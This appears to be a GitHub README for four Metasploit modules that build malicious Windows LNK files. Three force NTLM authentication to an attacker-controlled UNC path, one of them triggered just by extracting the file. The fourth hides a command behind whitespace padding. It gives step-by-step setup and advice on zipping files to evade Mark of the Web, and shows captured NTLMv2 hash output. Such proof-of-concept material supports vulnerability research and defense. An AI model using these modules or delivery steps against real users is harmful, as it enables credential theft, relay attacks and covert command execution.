# DataBlockNTLMLeak & Various Stuff
Here is my collection of `Extra Data` structure of Windows Shell Link (LNK) NTLM Leak Proof of Concept written in Metasploit (auxiliary module). I have few more to release but lets see if I'm not lazy :)

---

# 1. EnvironmentVariableDataBlock NTLM Leak - Metasploit Auxiliary Module
Right-Click Leak - Windows LNK File Special UNC Path NTLM Leak

### Overview
This module creates a Windows shortcut (LNK) file that specifies a special UNC path that can trigger an authentication attempt to a remote server. This can be used to harvest NTLM authentication credentials. When a victim right-clicks the LNK file, it will attempt to connect to the the specified UNC path, resulting in an SMB connection that can be captured to harvest credentials or perform relay attacks.

### 

1. Place the `EnvironmentVariableDataBlock_leak.rb` file in the Metasploit modules directory:
   ```
   cp EnvironmentVariableDataBlock_leak.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

2. Start Metasploit:
   ```
   msfconsole
   ```

3. Load the module:
   ```
   use auxiliary/windows/EnvironmentVariableDataBlock_leak
   ```

4. Configure the module:
   ```
   set FILENAME poc.lnk
   set UNC_PATH \\\\your_ip\\share
   set DESCRIPTION "Testing Purposes"
   ```

5. Execute the module:
   ```
   run
   ```

6. Set up a listener to capture authentication:
   ```
   use auxiliary/server/capture/smb
   run
   ```

7. MOTW? 
   ```
   1. ZIP the LNK file and host somewhere
   2. Download the file from victim side and extract the ZIP (WinRAR / 7-Zip) file. At this point, you don't have to worry about MOTW :-)
   3. Right-Click on the LNK file and it should send the NTLM hash to your MSF SMB Listener
   ```

## Options
- `FILENAME`: The name of the malicious LNK file to create
- `UNC_PATH`: The UNC path that will trigger the authentication attempt (e.g., \\\\attacker_ip\\share)
- `DESCRIPTION`: The description that will appear when hovering over the shortcut

--- 

# 2. IconEnvironmentDataBlock NTLM Leak - Metasploit Auxiliary Module
IconEnvironmentDataBlock - Windows LNK File Special UNC Path NTLM Leak

## Overview

This module creates a malicious Windows shortcut (LNK) file that specifies a special UNC path in IconEnvironmentDataBlock that can trigger an authentication attempt to a remote server. This can be used to harvest NTLM authentication credentials. When a victim browse to the location of the LNK file, it will attempt to connect to the the specified UNC path, resulting in an SMB connection that can be captured to harvest credentials or perform relay attacks.

## Usage

1. Place the `IconEnvironmentDataBlock_ntlm.rb` file in the Metasploit modules directory:
   ```
   cp IconEnvironmentDataBlock_ntlm.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

2. Start Metasploit:
   ```
   msfconsole
   ```

3. Load the module:
   ```
   use auxiliary/fileformat/IconEnvironmentDataBlock_ntlm
   ```

4. Configure the module:
   ```
   set FILENAME poc.lnk
   set UNC_PATH \\\\your_ip\\share
   set DESCRIPTION "Testing Purposes"
   set ICON_PATH a
   ```

5. Run the module to generate the LNK:
   ```
   run
   ```

6. Set up a listener to capture authentication:
   ```
   use auxiliary/server/capture/smb
   run
   ```

7. MOTW? 
   ```
   1. This is your call. Easiest way is to ZIP the LNK file and host somewhere (e.g. web server, etc.)
   2. Download from the client-side and extract the ZIP file. At this point, you don't have to worry about MOTW :-)
   3. Extract the ZIP file to any folder (e.g. Desktop) and observe the NTLMv2 hash send to your MSF SMB listener
   4. If you browse / refresh the folder that has the LNK store, it will send the NTLM hash to the server.
   5. If you copy & paste / delete / drag & drop (e.g. from VM to Host or from Host to VM) of the LNK, it will send the NTLM hash to the server.
   ```

## Options
- `FILENAME`: The name of the malicious LNK file to create
- `UNC_PATH`: The UNC path that will trigger the authentication attempt (e.g., \\\\attacker_ip\\share)
- `DESCRIPTION`: The description that will appear when hovering over the shortcut
- `ICON_PATH`: The path to your own icon. Does not necessary to point to actual ICON file (e.g. a)

---

# 3. SpecialFolderDatablock NTLM Leak - Metasploit Auxiliary Module
This one is the real 0-click LNK NTLM Leak

Description:
The SpecialFolderDataBlock is a data structure within Windows Shell Link (.LNK) files, defined as follows:
```c
typedef struct _SpecialFolderDataBlock {
    DWORD    BlockSize;        // Must be 0x00000010 (16 bytes)
    DWORD    BlockSignature;   // Must be 0xA0000005
    DWORD    SpecialFolderID;  // CSIDL value identifying the special folder
    DWORD    Offset;           // Offset to the first child ItemID in the IDList
} SPECIAL_FOLDER_DATA_BLOCK;
```
The SpecialFolderDataBlock is designed to help Windows maintain shortcut functionality when paths change. It provides two key pieces of information:
- Which special folder is being targeted (via SpecialFolderID)
- Where in the shortcut's ItemIDList that special folder's data begins (via Offset)

When a shortcut is loaded, Windows uses this information to:
- Locate the current path to the special folder (which may have changed)
- Replace or update the corresponding section of the shortcut's ItemIDList
- Maintain the shortcut's functionality despite system changes

The GUID {20D04FE0-3AEA-1069-A2D8-08002B30309D} is a special identifier that Windows uses to recognize the "My Computer" or "This PC" folder in the shell namespace. When you see this sequence in an ItemID within a Windows shortcut (.lnk) file, it indicates that the shortcut is referencing the "My Computer" location as part of its target path. 

In this proof of concept, I used two GUID and concatenate it to get the exploit works.
- Control Panel (All Tasks)
    - {ED7BA470-8E54-465E-825C-99712043E01C} 
- This PC
    - {20D04FE0-3AEA-1069-A2D8-08002B30309D}

These two GUID introduce the attack vector of UNC Path Injection for credential harvesting. The SpecialFolderDataBlock can be combined with network paths (UNC paths) to create shortcuts that connect to remote servers when activated.

Further investigation, I found that this seems to related with CVE-2017-8464 (LNK RCE) vulnerability. It seems the fix is not enough where it still allows UNC path to execute in the context of accessing share drive.

Attack Scenario:
- A shortcut is crafted with a SpecialFolderDataBlock that redirects to a UNC path (\\\\attacker-server\\share). When the victim access the shortcut, their system attempts to (force) authenticate to the attacker's server, sending their credentials.

Usage:
1. Setup the following pre-req then execute `run` command:
```
msf6 auxiliary(fileformat/specialfolder_lnk) > show options

Module options (auxiliary/fileformat/specialfolder_lnk):

   Name      Current Setting         Required  Description
   ----      ---------------         --------  -----------
   APPNAME   abc                     yes       Name of the application to display
   FILENAME  def.lnk                 yes       The LNK file name
   UNCPATH   \\192.168.44.128\share  yes       UNC path that will be accessed (\\server\share)

View the full module info with the info, or info -d command.
```

2. Once the LNK generated, archive the LNK file and deliver it via web (I hosted it using Python Server). On the victim side, download the archive file and extract in the same directory. The moment you extracted it, the NTLM hash will gets leaked. 
```
msf6 auxiliary(fileformat/specialfolder_lnk) > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[*] Server is running. Listening on 0.0.0.0:445
[*] Server started.

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 192.168.44.131
[SMB] NTLMv2-SSP Username   : DESKTOP-ABCDEFG\pokemon
[SMB] NTLMv2-SSP Hash       : pokemon::DESKTOP-ABCDEFG:078c9c8105d5b348:7219c59f7e2af0a03cb1c772b04a7cc6:01010000000000000008905dc5c1db017a891d0f46fea4c2000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008000008905dc5c1db010600040002000000080030003000000000000000000000000020000074c74f32e7de25f7436a66377dc75c94aaf8be0006c4cd2c745c6b3b3f83552f0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340034002e003100320038000000000000000000
```
 
Observed Result:
NTLMv2 credential successfully harvest and send to attacker server.

---

# 4. Windows LNK Padding - Metasploit Module

Full analysis can be found here, https://zeifan.my/Windows-LNK/. The write up consists of how to craft LNK :)

## Installation

1. Copy the `datablock_padding_lnk.rb` file to your Metasploit modules directory:
   ```
   cp datablock_padding_lnk.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

## Usage

#### Show Info
```
msf6 > use auxiliary/fileformat/datablock_padding_lnk
msf6 auxiliary(fileformat/datablock_padding_lnk) > show info

       Name: ZDI-CAN-25373 - Windows Shortcut (LNK) Padding
     Module: auxiliary/fileformat/datablock_padding_lnk
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2025-07-19

Provided by:
  Nafiez

Check supported:
  No

Basic options:
  Name         Current Setting                   Required  Description
  ----         ---------------                   --------  -----------
  BUFFER_SIZE  900                               yes       Buffer size before payload
  COMMAND      C:\Windows\System32\calc.exe      yes       Command to execute
  DESCRIPTION  testing purpose                   yes       LNK file description
  FILENAME     poc.lnk                           yes       The LNK filename to generate
  ICON_PATH    your_icon_path\WindowsBackup.ico  yes       Icon path for the LNK file

Description:
  This module generates Windows LNK (shortcut) file that can execute
  arbitrary commands. The LNK file uses environment variables and execute 
  its arguments from COMMAND_LINE_ARGUMENTS with extra juicy whitespace 
  character padding bytes and concatenates the actual payload.

References:
  https://zeifan.my/Windows-LNK/
  https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1
  https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html


View the full module info with the info -d command.
```

#### Show Options
```
msf6 auxiliary(fileformat/datablock_padding_lnk) > show options

Module options (auxiliary/fileformat/datablock_padding_lnk):

   Name         Current Setting                   Required  Description
   ----         ---------------                   --------  -----------
   BUFFER_SIZE  900                               yes       Buffer size before payload
   COMMAND      C:\Windows\System32\calc.exe      yes       Command to execute
   DESCRIPTION  testing purpose                   yes       LNK file description
   FILENAME     poc.lnk                           yes       The LNK filename to generate
   ICON_PATH    your_icon_path\WindowsBackup.ico  yes       Icon path for the LNK file


View the full module info with the info, or info -d command
```

#### Generate LNK
```
msf6 auxiliary(fileformat/datablock_padding_lnk) > run

[*] Generating LNK file: poc.lnk
[+] poc.lnk stored at /root/.msf4/local/poc.lnk
[+] Successfully created poc.lnk
[*] Command line buffer size: 900 bytes
[*] Target command: C:\Windows\System32\calc.exe
[*] Auxiliary module execution completed
```

